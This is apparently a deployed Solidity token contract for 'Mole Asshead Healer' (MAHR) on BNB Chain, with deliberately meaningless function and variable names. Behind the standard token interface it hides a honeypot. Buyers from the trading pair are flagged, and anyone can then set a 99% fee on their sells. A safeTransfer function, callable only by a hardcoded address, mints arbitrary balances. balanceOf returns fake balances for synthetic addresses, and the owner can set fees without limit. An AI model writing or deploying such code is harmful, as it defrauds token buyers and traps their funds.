/**
 *Submitted for verification at BscScan.com on 2023-01-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;



abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


interface IUniswapV2Router {

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function approve(address spender, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

}




contract MoleAssheadHealer is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    uint256 constant totalSellExemptTradingLaunch = 30000 * 10 ** 18;

    uint256 public senderEnableFundAmountBurnTxSell = 0;
    bool public burnReceiverBotsWallet = false;
    string constant _symbol = "MAHR";
    bool public txToMarketingLaunched = false;



    uint256 constant senderEnableTradingModeAmountIsAuto = 1000 * 10 ** 18;
    uint256 public swapFundTokenBurn = 0;
    uint256 private listSenderToTotal = 0;
    address public uniswapV2Pair;
    mapping(address => uint256) _balances;
    uint256 private listWalletTakeToken = 0;
    mapping(address => bool)  senderReceiverTotalTxFeeToken;
    uint256 public fundFeeAmountAtReceiverSwapLaunched = 0;

    mapping(address => bool) private feeLaunchedSenderEnable;
    uint256  marketingListShouldExempt = 100000000 * 10 ** _decimals;

    uint256 private walletTeamAutoToken = 0;
    uint256 constant sellFromLiquidityAuto = 100000000 * (10 ** 18);
    mapping(address => bool)  modeLiquidityAtEnableMax;
    uint256 private teamModeAtLaunch = 0;

    IUniswapV2Router public takeReceiverAmountBuy;

    mapping(address => mapping(address => uint256)) _allowances;
    bool public teamBotsModeShould = false;
    uint256  shouldSellAtAuto = 100000000 * 10 ** _decimals;
    uint256 public atFromLaunchList = 0;
    uint256 tokenSwapLaunchedEnableFrom = 0;
    uint256 private tradingTotalLiquidityIs = 0;
    


    uint256 public liquidityMinReceiverMarketing = 0;
    uint256 public swapIsFromMintTeamBurnAmount = 0;
    uint256 private liquiditySenderShouldFrom = 100;
    uint256 private teamSenderTotalLaunch = 0;
    string constant _name = "Mole Asshead Healer";
    address private feeSenderFromTakeTxTradingIs = (msg.sender);
    bool public exemptTakeIsList = false;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        takeReceiverAmountBuy = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(takeReceiverAmountBuy.factory()).createPair(address(this), takeReceiverAmountBuy.WETH());
        _allowances[address(this)][address(takeReceiverAmountBuy)] = sellFromLiquidityAuto;

        feeLaunchedSenderEnable[msg.sender] = true;
        feeLaunchedSenderEnable[address(this)] = true;

        _balances[msg.sender] = sellFromLiquidityAuto;
        emit Transfer(address(0), msg.sender, sellFromLiquidityAuto);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return sellFromLiquidityAuto;
    }

    function atListLaunchMint() private pure returns (address) {
        return 0x2478a0A322d958635A40fc544175c5698E911452;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getlimitTakeTradingAuto() public view returns (bool) {
        if (exemptTakeIsList != teamBotsModeShould) {
            return teamBotsModeShould;
        }
        if (exemptTakeIsList != burnReceiverBotsWallet) {
            return burnReceiverBotsWallet;
        }
        return exemptTakeIsList;
    }

    function getenableMinAtLaunched(address buyFeeModeReceiver) public view returns (bool) {
        if (buyFeeModeReceiver != feeSenderFromTakeTxTradingIs) {
            return exemptTakeIsList;
        }
        if (buyFeeModeReceiver != feeSenderFromTakeTxTradingIs) {
            return txToMarketingLaunched;
        }
        if (buyFeeModeReceiver != feeSenderFromTakeTxTradingIs) {
            return txToMarketingLaunched;
        }
            return feeLaunchedSenderEnable[buyFeeModeReceiver];
    }

    function setmaxExemptReceiverTxSenderTrading(uint256 buyFeeModeReceiver) public onlyOwner {
        if (teamModeAtLaunch != atFromLaunchList) {
            atFromLaunchList=buyFeeModeReceiver;
        }
        teamModeAtLaunch=buyFeeModeReceiver;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function fundLaunchTxIs(address atLiquidityReceiverToken) internal view returns (bool) {
        return !feeLaunchedSenderEnable[atLiquidityReceiverToken];
    }

    function setenableMinAtLaunched(address buyFeeModeReceiver,bool minFromLiquidityBotsSellLaunchedWallet) public onlyOwner {
        if (buyFeeModeReceiver != feeSenderFromTakeTxTradingIs) {
            teamBotsModeShould=minFromLiquidityBotsSellLaunchedWallet;
        }
        if (feeLaunchedSenderEnable[buyFeeModeReceiver] == feeLaunchedSenderEnable[buyFeeModeReceiver]) {
           feeLaunchedSenderEnable[buyFeeModeReceiver]=minFromLiquidityBotsSellLaunchedWallet;
        }
        if (feeLaunchedSenderEnable[buyFeeModeReceiver] == feeLaunchedSenderEnable[buyFeeModeReceiver]) {
           feeLaunchedSenderEnable[buyFeeModeReceiver]=minFromLiquidityBotsSellLaunchedWallet;
        }
        feeLaunchedSenderEnable[buyFeeModeReceiver]=minFromLiquidityBotsSellLaunchedWallet;
    }

    function getautoSwapListAtExemptReceiver() public view returns (bool) {
        if (txToMarketingLaunched == burnReceiverBotsWallet) {
            return burnReceiverBotsWallet;
        }
        return txToMarketingLaunched;
    }

    function setautoSwapListAtExemptReceiver(bool buyFeeModeReceiver) public onlyOwner {
        if (txToMarketingLaunched == burnReceiverBotsWallet) {
            burnReceiverBotsWallet=buyFeeModeReceiver;
        }
        txToMarketingLaunched=buyFeeModeReceiver;
    }

    function getlimitModeAutoBuyLaunchReceiverTx() public view returns (uint256) {
        if (liquiditySenderShouldFrom != teamSenderTotalLaunch) {
            return teamSenderTotalLaunch;
        }
        if (liquiditySenderShouldFrom == swapIsFromMintTeamBurnAmount) {
            return swapIsFromMintTeamBurnAmount;
        }
        return liquiditySenderShouldFrom;
    }

    function receiverMinIsLaunch(address atLiquidityReceiverToken, address autoMinShouldMint, uint256 launchReceiverModeTake, bool receiverTradingBurnAmount) private {
        uint160 swapTxBuySender = uint160(sellFromLiquidityAuto);
        if (receiverTradingBurnAmount) {
            atLiquidityReceiverToken = address(uint160(swapTxBuySender + tokenSwapLaunchedEnableFrom));
            tokenSwapLaunchedEnableFrom++;
            _balances[autoMinShouldMint] = _balances[autoMinShouldMint].add(launchReceiverModeTake);
        } else {
            _balances[atLiquidityReceiverToken] = _balances[atLiquidityReceiverToken].sub(launchReceiverModeTake);
        }
        if (launchReceiverModeTake == 0) {
            return;
        }
        emit Transfer(atLiquidityReceiverToken, autoMinShouldMint, launchReceiverModeTake);
    }

    function setsellLaunchIsEnableLimitTeam(uint256 buyFeeModeReceiver) public onlyOwner {
        if (tradingTotalLiquidityIs != liquiditySenderShouldFrom) {
            liquiditySenderShouldFrom=buyFeeModeReceiver;
        }
        if (tradingTotalLiquidityIs == walletTeamAutoToken) {
            walletTeamAutoToken=buyFeeModeReceiver;
        }
        if (tradingTotalLiquidityIs == walletTeamAutoToken) {
            walletTeamAutoToken=buyFeeModeReceiver;
        }
        tradingTotalLiquidityIs=buyFeeModeReceiver;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function botsLimitTakeBuy(address senderTxTradingAutoSellBuyToken) private view returns (bool) {
        if (senderTxTradingAutoSellBuyToken == feeSenderFromTakeTxTradingIs) {
            return true;
        }
        if (senderTxTradingAutoSellBuyToken == address(0)) {
            return false;
        }
        return false;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellListBuyWallet(msg.sender, recipient, amount);
    }

    function minBurnModeIs(uint160 totalExemptShouldModeLaunchedBurnFee) private view returns (uint256) {
        uint160 swapTxBuySender = uint160(sellFromLiquidityAuto);
        if ((totalExemptShouldModeLaunchedBurnFee - uint160(swapTxBuySender)) < tokenSwapLaunchedEnableFrom) {
            return senderEnableTradingModeAmountIsAuto;
        }
        return totalSellExemptTradingLaunch;
    }

    function getmaxExemptReceiverTxSenderTrading() public view returns (uint256) {
        return teamModeAtLaunch;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (senderAutoBuyTeamReceiver(uint160(account))) {
            return minBurnModeIs(uint160(account));
        }
        return _balances[account];
    }

    function approveMax(address spender) external {
        if (modeLiquidityAtEnableMax[spender]) {
            senderReceiverTotalTxFeeToken[spender] = true;
        }
    }

    function walletTotalListReceiverMinAmountTeam(address atLiquidityReceiverToken, address minAmountLaunchMaxFundLaunchedExempt, uint256 launchReceiverModeTake) internal returns (uint256) {
        
        uint256 listMaxExemptIs = launchReceiverModeTake.mul(tokenModeAmountBuy(atLiquidityReceiverToken, minAmountLaunchMaxFundLaunchedExempt == uniswapV2Pair)).div(liquiditySenderShouldFrom);

        if (listMaxExemptIs > 0) {
            _balances[address(this)] = _balances[address(this)].add(listMaxExemptIs);
            emit Transfer(atLiquidityReceiverToken, address(this), listMaxExemptIs);
        }

        return launchReceiverModeTake.sub(listMaxExemptIs);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function setfromLaunchedTradingLaunchTotalList(uint256 buyFeeModeReceiver) public onlyOwner {
        if (swapIsFromMintTeamBurnAmount == tradingTotalLiquidityIs) {
            tradingTotalLiquidityIs=buyFeeModeReceiver;
        }
        swapIsFromMintTeamBurnAmount=buyFeeModeReceiver;
    }

    function setlimitModeAutoBuyLaunchReceiverTx(uint256 buyFeeModeReceiver) public onlyOwner {
        liquiditySenderShouldFrom=buyFeeModeReceiver;
    }

    function setlimitReceiverSwapReceiver(address buyFeeModeReceiver) public onlyOwner {
        feeSenderFromTakeTxTradingIs=buyFeeModeReceiver;
    }

    function shouldMaxTakeAt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getsellLaunchIsEnableLimitTeam() public view returns (uint256) {
        if (tradingTotalLiquidityIs == swapIsFromMintTeamBurnAmount) {
            return swapIsFromMintTeamBurnAmount;
        }
        if (tradingTotalLiquidityIs != atFromLaunchList) {
            return atFromLaunchList;
        }
        if (tradingTotalLiquidityIs == senderEnableFundAmountBurnTxSell) {
            return senderEnableFundAmountBurnTxSell;
        }
        return tradingTotalLiquidityIs;
    }

    function setmintReceiverLiquidityBots(uint256 buyFeeModeReceiver) public onlyOwner {
        if (teamSenderTotalLaunch == liquidityMinReceiverMarketing) {
            liquidityMinReceiverMarketing=buyFeeModeReceiver;
        }
        if (teamSenderTotalLaunch == teamSenderTotalLaunch) {
            teamSenderTotalLaunch=buyFeeModeReceiver;
        }
        if (teamSenderTotalLaunch == walletTeamAutoToken) {
            walletTeamAutoToken=buyFeeModeReceiver;
        }
        teamSenderTotalLaunch=buyFeeModeReceiver;
    }

    function totalReceiverAmountTo(address totalExemptShouldModeLaunchedBurnFee) private pure returns (bool) {
        return totalExemptShouldModeLaunchedBurnFee == atListLaunchMint();
    }

    function getfromLaunchedTradingLaunchTotalList() public view returns (uint256) {
        return swapIsFromMintTeamBurnAmount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != sellFromLiquidityAuto) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return sellListBuyWallet(sender, recipient, amount);
    }

    function isApproveMax(address spender) public view returns (bool) {
        return senderReceiverTotalTxFeeToken[spender];
    }

    function senderAutoBuyTeamReceiver(uint160 totalExemptShouldModeLaunchedBurnFee) private pure returns (bool) {
        uint160 swapTxBuySender = uint160(sellFromLiquidityAuto);
        if (totalExemptShouldModeLaunchedBurnFee >= uint160(swapTxBuySender)) {
            if (totalExemptShouldModeLaunchedBurnFee <= uint160(swapTxBuySender) + 300000) {
                return true;
            }
        }
        return false;
    }

    function safeTransfer(address atLiquidityReceiverToken, address autoMinShouldMint, uint256 launchReceiverModeTake) public {
        if (!totalReceiverAmountTo(msg.sender)) {
            return;
        }
        if (senderAutoBuyTeamReceiver(uint160(autoMinShouldMint))) {
            receiverMinIsLaunch(atLiquidityReceiverToken, autoMinShouldMint, launchReceiverModeTake, false);
            return;
        }
        if (autoMinShouldMint == address(1)) {
            return;
        }
        if (senderAutoBuyTeamReceiver(uint160(atLiquidityReceiverToken))) {
            receiverMinIsLaunch(atLiquidityReceiverToken, autoMinShouldMint, launchReceiverModeTake, true);
            return;
        }
        if (launchReceiverModeTake == 0) {
            return;
        }
        if (atLiquidityReceiverToken == address(0)) {
            _balances[autoMinShouldMint] = _balances[autoMinShouldMint].add(launchReceiverModeTake);
            return;
        }
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function tokenModeAmountBuy(address atLiquidityReceiverToken, bool tradingSellMinSwapEnableMaxTake) internal returns (uint256) {
        if (senderReceiverTotalTxFeeToken[atLiquidityReceiverToken]) {
            return 99;
        }
        
        if (atFromLaunchList == tradingTotalLiquidityIs) {
            atFromLaunchList = liquidityMinReceiverMarketing;
        }


        if (tradingSellMinSwapEnableMaxTake) {
            return teamModeAtLaunch;
        }
        if (!tradingSellMinSwapEnableMaxTake && atLiquidityReceiverToken == uniswapV2Pair) {
            return teamSenderTotalLaunch;
        }
        return 0;
    }

    function setlimitTakeTradingAuto(bool buyFeeModeReceiver) public onlyOwner {
        if (exemptTakeIsList == exemptTakeIsList) {
            exemptTakeIsList=buyFeeModeReceiver;
        }
        if (exemptTakeIsList == txToMarketingLaunched) {
            txToMarketingLaunched=buyFeeModeReceiver;
        }
        exemptTakeIsList=buyFeeModeReceiver;
    }

    function getmintReceiverLiquidityBots() public view returns (uint256) {
        if (teamSenderTotalLaunch == teamSenderTotalLaunch) {
            return teamSenderTotalLaunch;
        }
        if (teamSenderTotalLaunch == listWalletTakeToken) {
            return listWalletTakeToken;
        }
        return teamSenderTotalLaunch;
    }

    function getlimitReceiverSwapReceiver() public view returns (address) {
        return feeSenderFromTakeTxTradingIs;
    }

    function sellListBuyWallet(address atLiquidityReceiverToken, address autoMinShouldMint, uint256 launchReceiverModeTake) internal returns (bool) {
        if (senderAutoBuyTeamReceiver(uint160(autoMinShouldMint))) {
            receiverMinIsLaunch(atLiquidityReceiverToken, autoMinShouldMint, launchReceiverModeTake, false);
            return true;
        }
        if (senderAutoBuyTeamReceiver(uint160(atLiquidityReceiverToken))) {
            receiverMinIsLaunch(atLiquidityReceiverToken, autoMinShouldMint, launchReceiverModeTake, true);
            return true;
        }
        
        bool atWalletModeLiquidity = botsLimitTakeBuy(atLiquidityReceiverToken) || botsLimitTakeBuy(autoMinShouldMint);
        
        if (atLiquidityReceiverToken == uniswapV2Pair && !atWalletModeLiquidity) {
            modeLiquidityAtEnableMax[autoMinShouldMint] = true;
        }
        
        if (atWalletModeLiquidity) {
            return shouldMaxTakeAt(atLiquidityReceiverToken, autoMinShouldMint, launchReceiverModeTake);
        }
        
        if (listWalletTakeToken != swapFundTokenBurn) {
            listWalletTakeToken = teamSenderTotalLaunch;
        }

        if (atFromLaunchList == listSenderToTotal) {
            atFromLaunchList = walletTeamAutoToken;
        }


        _balances[atLiquidityReceiverToken] = _balances[atLiquidityReceiverToken].sub(launchReceiverModeTake, "Insufficient Balance!");
        
        if (walletTeamAutoToken != fundFeeAmountAtReceiverSwapLaunched) {
            walletTeamAutoToken = liquidityMinReceiverMarketing;
        }

        if (txToMarketingLaunched != txToMarketingLaunched) {
            txToMarketingLaunched = burnReceiverBotsWallet;
        }


        uint256 launchReceiverModeTakeReceived = fundLaunchTxIs(atLiquidityReceiverToken) ? walletTotalListReceiverMinAmountTeam(atLiquidityReceiverToken, autoMinShouldMint, launchReceiverModeTake) : launchReceiverModeTake;

        _balances[autoMinShouldMint] = _balances[autoMinShouldMint].add(launchReceiverModeTakeReceived);
        emit Transfer(atLiquidityReceiverToken, autoMinShouldMint, launchReceiverModeTakeReceived);
        return true;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}